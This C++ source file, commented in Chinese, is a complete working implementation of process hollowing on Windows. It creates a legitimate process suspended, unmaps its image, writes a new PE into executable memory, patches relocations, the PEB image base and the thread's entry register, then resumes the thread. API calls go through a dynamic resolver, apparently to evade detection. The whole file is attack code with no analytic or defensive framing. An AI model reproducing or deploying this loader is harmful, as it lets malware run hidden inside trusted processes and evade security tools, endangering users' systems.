#include "../include/HollowingCore.h"

namespace Hollowing {
    /**
     * @brief 进程镂空 (Process Hollowing) 核心实现
     * 
     * 镂空的 6 个标准步骤：
     * 1. CreateProcess (CREATE_SUSPENDED): 创建挂起的宿主进程。
     * 2. NtUnmapViewOfSection: 卸载宿主进程原有的内存镜像。
     * 3. VirtualAllocEx: 在宿主进程中分配新内存。
     * 4. WriteProcessMemory: 映射新 PE 的头和各节区。
     * 5. SetThreadContext: 修正入口点 (EntryPoint) 并更新 PEB。
     * 6. ResumeThread: 恢复执行。
     */
    bool HollowingCore::PerformHollowing(const std::string& targetPath, const PE_INFO& peInfo) {
        LOG_INFO("正在对目标进程执行镂空操作: " + targetPath);
        APIResolver& api = APIResolver::GetInstance();

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // 步骤 1: 以挂起模式创建宿主进程
        if (!api.CreateProcessA(NULL, (LPSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            LOG_ERROR("无法创建宿主进程");
            return false;
        }
        LOG_INFO("宿主进程已创建 (PID: " + std::to_string(pi.dwProcessId) + ")");

        // 获取宿主进程的 ImageBase (从 PEB 获取)
        ULONG_PTR remoteImageBase = 0;
        if (peInfo.is64Bit) {
            CONTEXT ctx;
            ctx.ContextFlags = CONTEXT_FULL;
            if (!api.GetThreadContext(pi.hThread, &ctx)) {
                LOG_ERROR("获取线程上下文失败");
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
            // 64 位下，ImageBase 地址位于 PEB + 0x10，PEB 地址在 RDX
            if (!api.ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteImageBase, sizeof(remoteImageBase), NULL)) {
                LOG_ERROR("读取远程进程 ImageBase 失败");
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
        } else {
            WOW64_CONTEXT ctx;
            ctx.ContextFlags = WOW64_CONTEXT_FULL;
            BOOL success = FALSE;
            if (api.Wow64GetThreadContext) {
                success = api.Wow64GetThreadContext(pi.hThread, &ctx);
            } else {
                success = api.GetThreadContext(pi.hThread, (LPCONTEXT)&ctx);
            }
            if (!success) {
                LOG_ERROR("获取 WOW64 线程上下文失败");
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
            // 32 位下，ImageBase 地址位于 PEB + 0x8，PEB 地址在 EBX
            DWORD base32 = 0;
            if (!api.ReadProcessMemory(pi.hProcess, (PVOID)(ULONG_PTR)(ctx.Ebx + 0x8), &base32, sizeof(base32), NULL)) {
                LOG_ERROR("读取远程进程 ImageBase (32位) 失败");
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
            remoteImageBase = base32;
        }

        // 步骤 2: 卸载宿主进程原始内存镜像 (仅当原基址与新 PE 基址冲突时)
        ULONG_PTR imageBase = peInfo.is64Bit ? peInfo.ntHeaders64->OptionalHeader.ImageBase : peInfo.ntHeaders32->OptionalHeader.ImageBase;
        DWORD imageSize = peInfo.is64Bit ? peInfo.ntHeaders64->OptionalHeader.SizeOfImage : peInfo.ntHeaders32->OptionalHeader.SizeOfImage;

        if (api.NtUnmapViewOfSection) {
            // 如果基址冲突，或者为了强制镂空，尝试卸载
            if (remoteImageBase == imageBase) {
                LOG_INFO("检测到基址冲突，正在卸载原始内存镜像，基址: " + std::to_string(remoteImageBase));
                NTSTATUS status = api.NtUnmapViewOfSection(pi.hProcess, (PVOID)remoteImageBase);
                if (status != 0) {
                    LOG_DEBUG("NtUnmapViewOfSection 返回状态码: " + std::to_string(status));
                }
            } else {
                LOG_INFO("基址不冲突，跳过卸载操作 (新基址: " + std::to_string(imageBase) + ")");
            }
        }

        // 步骤 3: 为新 PE 分配内存

        // 尝试在首选地址分配
        PVOID remoteBase = api.VirtualAllocEx(pi.hProcess, (PVOID)imageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            LOG_INFO("首选地址分配失败，正在自动选择新地址...");
            remoteBase = api.VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteBase) {
                LOG_ERROR("内存分配失败");
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
        }
        LOG_INFO("内存已在目标进程中分配，地址: " + std::to_string((ULONG_PTR)remoteBase));

        // 步骤 4: 映射新 PE 的头和各节区
        DWORD headerSize = peInfo.is64Bit ? peInfo.ntHeaders64->OptionalHeader.SizeOfHeaders : peInfo.ntHeaders32->OptionalHeader.SizeOfHeaders;
        if (!api.WriteProcessMemory(pi.hProcess, remoteBase, peInfo.data.data(), headerSize, NULL)) {
            LOG_ERROR("PE 头部写入失败");
            api.TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // 遍历并写入每个节区 (如 .text, .data, .rdata 等)
        // 修正：使用 e_lfanew + sizeof(NT_HEADERS) 计算节表起始位置，避免 OptionalHeader 大小差异导致的错位
        DWORD ntHeadersSize = peInfo.is64Bit ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32);
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(peInfo.data.data() + peInfo.dosHeader->e_lfanew + ntHeadersSize);
        WORD numberOfSections = peInfo.is64Bit ? peInfo.ntHeaders64->FileHeader.NumberOfSections : peInfo.ntHeaders32->FileHeader.NumberOfSections;

        for (int i = 0; i < numberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData == 0) continue;
            PVOID dest = (PVOID)((ULONG_PTR)remoteBase + sectionHeader[i].VirtualAddress);
            PVOID src = (PVOID)(peInfo.data.data() + sectionHeader[i].PointerToRawData);
            if (!api.WriteProcessMemory(pi.hProcess, dest, src, sectionHeader[i].SizeOfRawData, NULL)) {
                LOG_ERROR("节区写入失败: " + std::string((char*)sectionHeader[i].Name));
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
            LOG_DEBUG("节区已映射: " + std::string((char*)sectionHeader[i].Name));
        }

        // 步骤 5: 处理重定位 (如果实际加载基址不等于首选基址)
        ULONG_PTR delta = (ULONG_PTR)remoteBase - imageBase;
        if (delta != 0) {
            LOG_INFO("需要进行基址重定位，偏移量: " + std::to_string(delta));
            if (!FixRelocations(pi.hProcess, remoteBase, peInfo, delta)) {
                LOG_ERROR("重定位修复失败");
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
        }

        // 步骤 6: 修复导入表 (IAT) - (简化为可选或移除)
        // 在标准的进程镂空中，如果 PEB ImageBase 更新正确，系统加载器（Ldr）通常会自动处理 IAT。
        // 参考代码中没有手动修复 IAT，我们也将其设为非必须。
        /*
        LOG_INFO("正在修复导入表 (IAT)...");
        if (!FixImports(pi.hProcess, peInfo, remoteBase)) {
            LOG_ERROR("导入表修复失败");
            // api.TerminateProcess(pi.hProcess, 0); // IAT 失败不一定导致无法运行，尝试继续
            // return false;
        }
        */

        // 步骤 7: 修正线程上下文 (EntryPoint) 并更新 PEB
        ULONG_PTR entryPoint = (ULONG_PTR)remoteBase + (peInfo.is64Bit ? peInfo.ntHeaders64->OptionalHeader.AddressOfEntryPoint : peInfo.ntHeaders32->OptionalHeader.AddressOfEntryPoint);

        if (peInfo.is64Bit) {
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_FULL;
            api.GetThreadContext(pi.hThread, &ctx);
            // 修正：x64 下主线程入口点寄存器为 RCX
            ctx.Rcx = entryPoint;
            // 更新 PEB 中的 ImageBaseAddress
            if (!api.WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, sizeof(remoteBase), NULL)) {
                LOG_ERROR("更新远程 PEB ImageBase 失败");
            }
            api.SetThreadContext(pi.hThread, &ctx);
        } else {
            WOW64_CONTEXT ctx = { 0 };
            ctx.ContextFlags = WOW64_CONTEXT_FULL;
            if (api.Wow64GetThreadContext) {
                api.Wow64GetThreadContext(pi.hThread, &ctx);
            } else {
                api.GetThreadContext(pi.hThread, (LPCONTEXT)&ctx);
            }
            // x86 下入口点寄存器为 EAX
            ctx.Eax = (DWORD)entryPoint;
            // 更新 PEB 中的 ImageBaseAddress (32位用 4 字节)
            DWORD base32 = (DWORD)(ULONG_PTR)remoteBase;
            if (!api.WriteProcessMemory(pi.hProcess, (PVOID)(ULONG_PTR)(ctx.Ebx + 0x8), &base32, sizeof(base32), NULL)) {
                LOG_ERROR("更新远程 PEB ImageBase (32位) 失败");
            }
            if (api.Wow64SetThreadContext) {
                api.Wow64SetThreadContext(pi.hThread, &ctx);
            } else {
                api.SetThreadContext(pi.hThread, (LPCONTEXT)&ctx);
            }
        }
        LOG_INFO("线程上下文已更新，入口点: " + std::to_string(entryPoint));

        // 步骤 8: 恢复线程执行
        if (api.ResumeThread(pi.hThread) == (DWORD)-1) {
            LOG_ERROR("恢复线程执行失败");
            api.TerminateProcess(pi.hProcess, 0);
            return false;
        }
        LOG_INFO("进程已成功恢复执行!");

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }

    bool HollowingCore::FixRelocations(HANDLE hProcess, PVOID remoteBase, const PE_INFO& peInfo, ULONG_PTR delta) {
        APIResolver& api = APIResolver::GetInstance();
        IMAGE_DATA_DIRECTORY relocDir = peInfo.is64Bit ? 
            peInfo.ntHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] : 
            peInfo.ntHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir.Size == 0 || relocDir.VirtualAddress == 0) {
            LOG_INFO("PE 文件没有重定位表或重定位表为空");
            return true;
        }

        // 查找 .reloc 节在文件中的偏移
        DWORD relocOffset = 0;
        PIMAGE_SECTION_HEADER sectionHeader = peInfo.is64Bit ? IMAGE_FIRST_SECTION(peInfo.ntHeaders64) : IMAGE_FIRST_SECTION(peInfo.ntHeaders32);
        WORD numberOfSections = peInfo.is64Bit ? peInfo.ntHeaders64->FileHeader.NumberOfSections : peInfo.ntHeaders32->FileHeader.NumberOfSections;

        for (int i = 0; i < numberOfSections; i++) {
            if (sectionHeader[i].VirtualAddress <= relocDir.VirtualAddress && 
                relocDir.VirtualAddress < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                relocOffset = sectionHeader[i].PointerToRawData + (relocDir.VirtualAddress - sectionHeader[i].VirtualAddress);
                break;
            }
        }

        if (relocOffset == 0) {
            LOG_ERROR("未能找到重定位节的文件偏移");
            return false;
        }

        DWORD parsedSize = 0;
        while (parsedSize < relocDir.Size) {
            PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)(peInfo.data.data() + relocOffset + parsedSize);
            if (block->SizeOfBlock == 0) break;

            DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD list = (PWORD)((ULONG_PTR)block + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < count; i++) {
                WORD type = list[i] >> 12;
                WORD offset = list[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR address = (ULONG_PTR)remoteBase + block->VirtualAddress + offset;
                    ULONG_PTR value = 0;
                    SIZE_T size = peInfo.is64Bit ? 8 : 4;
                    if (!api.ReadProcessMemory(hProcess, (PVOID)address, &value, size, NULL)) continue;
                    value += delta;
                    api.WriteProcessMemory(hProcess, (PVOID)address, &value, size, NULL);
                }
            }
            parsedSize += block->SizeOfBlock;
        }
        return true;
    }

    bool HollowingCore::FixImports(HANDLE hProcess, const PE_INFO& peInfo, PVOID remoteBase) {
        APIResolver& api = APIResolver::GetInstance();
        IMAGE_DATA_DIRECTORY importDir = peInfo.is64Bit ?
            peInfo.ntHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] :
            peInfo.ntHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

        if (importDir.Size == 0 || importDir.VirtualAddress == 0) return true;

        // 获取导入表文件偏移
        DWORD importOffset = 0;
        PIMAGE_SECTION_HEADER sectionHeader = peInfo.is64Bit ? IMAGE_FIRST_SECTION(peInfo.ntHeaders64) : IMAGE_FIRST_SECTION(peInfo.ntHeaders32);
        WORD numberOfSections = peInfo.is64Bit ? peInfo.ntHeaders64->FileHeader.NumberOfSections : peInfo.ntHeaders32->FileHeader.NumberOfSections;

        for (int i = 0; i < numberOfSections; i++) {
            if (sectionHeader[i].VirtualAddress <= importDir.VirtualAddress &&
                importDir.VirtualAddress < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                importOffset = sectionHeader[i].PointerToRawData + (importDir.VirtualAddress - sectionHeader[i].VirtualAddress);
                break;
            }
        }

        if (importOffset == 0) return false;

        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(peInfo.data.data() + importOffset);

        while (importDesc->Name != 0) {
            // 查找 DLL 名称的文件偏移
            DWORD nameOffset = 0;
            for (int i = 0; i < numberOfSections; i++) {
                if (sectionHeader[i].VirtualAddress <= importDesc->Name &&
                    importDesc->Name < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                    nameOffset = sectionHeader[i].PointerToRawData + (importDesc->Name - sectionHeader[i].VirtualAddress);
                    break;
                }
            }

            if (nameOffset == 0) {
                importDesc++;
                continue;
            }

            const char* dllName = (const char*)(peInfo.data.data() + nameOffset);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                LOG_ERROR("无法加载依赖 DLL: " + std::string(dllName));
                return false;
            }

            // 处理 Thunk (IAT)
            DWORD thunkRVA = importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk;
            DWORD iatRVA = importDesc->FirstThunk;

            DWORD thunkOffset = 0;
            for (int i = 0; i < numberOfSections; i++) {
                if (sectionHeader[i].VirtualAddress <= thunkRVA &&
                    thunkRVA < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                    thunkOffset = sectionHeader[i].PointerToRawData + (thunkRVA - sectionHeader[i].VirtualAddress);
                    break;
                }
            }

            if (thunkOffset != 0) {
                if (peInfo.is64Bit) {
                    PIMAGE_THUNK_DATA64 thunk = (PIMAGE_THUNK_DATA64)(peInfo.data.data() + thunkOffset);
                    DWORD iatIdx = 0;
                    while (thunk->u1.AddressOfData != 0) {
                        ULONG_PTR funcAddr = 0;
                        if (IMAGE_SNAP_BY_ORDINAL64(thunk->u1.Ordinal)) {
                            funcAddr = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL64(thunk->u1.Ordinal));
                        } else {
                            DWORD nameRefOffset = 0;
                            DWORD rva = (DWORD)thunk->u1.AddressOfData;
                            for (int i = 0; i < numberOfSections; i++) {
                                if (sectionHeader[i].VirtualAddress <= rva &&
                                    rva < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                                    nameRefOffset = sectionHeader[i].PointerToRawData + (rva - sectionHeader[i].VirtualAddress);
                                    break;
                                }
                            }
                            if (nameRefOffset != 0) {
                                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(peInfo.data.data() + nameRefOffset);
                                funcAddr = (ULONG_PTR)GetProcAddress(hDll, importByName->Name);
                            }
                        }

                        if (funcAddr != 0) {
                            PVOID remoteIatAddr = (PVOID)((ULONG_PTR)remoteBase + iatRVA + (iatIdx * sizeof(ULONG_PTR)));
                            api.WriteProcessMemory(hProcess, remoteIatAddr, &funcAddr, sizeof(funcAddr), NULL);
                        }
                        thunk++;
                        iatIdx++;
                    }
                } else {
                    PIMAGE_THUNK_DATA32 thunk = (PIMAGE_THUNK_DATA32)(peInfo.data.data() + thunkOffset);
                    DWORD iatIdx = 0;
                    while (thunk->u1.AddressOfData != 0) {
                        DWORD funcAddr = 0;
                        if (IMAGE_SNAP_BY_ORDINAL32(thunk->u1.Ordinal)) {
                            funcAddr = (DWORD)(ULONG_PTR)GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL32(thunk->u1.Ordinal));
                        } else {
                            DWORD nameRefOffset = 0;
                            DWORD rva = (DWORD)thunk->u1.AddressOfData;
                            for (int i = 0; i < numberOfSections; i++) {
                                if (sectionHeader[i].VirtualAddress <= rva &&
                                    rva < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                                    nameRefOffset = sectionHeader[i].PointerToRawData + (rva - sectionHeader[i].VirtualAddress);
                                    break;
                                }
                            }
                            if (nameRefOffset != 0) {
                                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(peInfo.data.data() + nameRefOffset);
                                funcAddr = (DWORD)(ULONG_PTR)GetProcAddress(hDll, importByName->Name);
                            }
                        }

                        if (funcAddr != 0) {
                            PVOID remoteIatAddr = (PVOID)((ULONG_PTR)remoteBase + iatRVA + (iatIdx * sizeof(DWORD)));
                            api.WriteProcessMemory(hProcess, remoteIatAddr, &funcAddr, sizeof(funcAddr), NULL);
                        }
                        thunk++;
                        iatIdx++;
                    }
                }
            }
            importDesc++;
        }
        return true;
    }
}
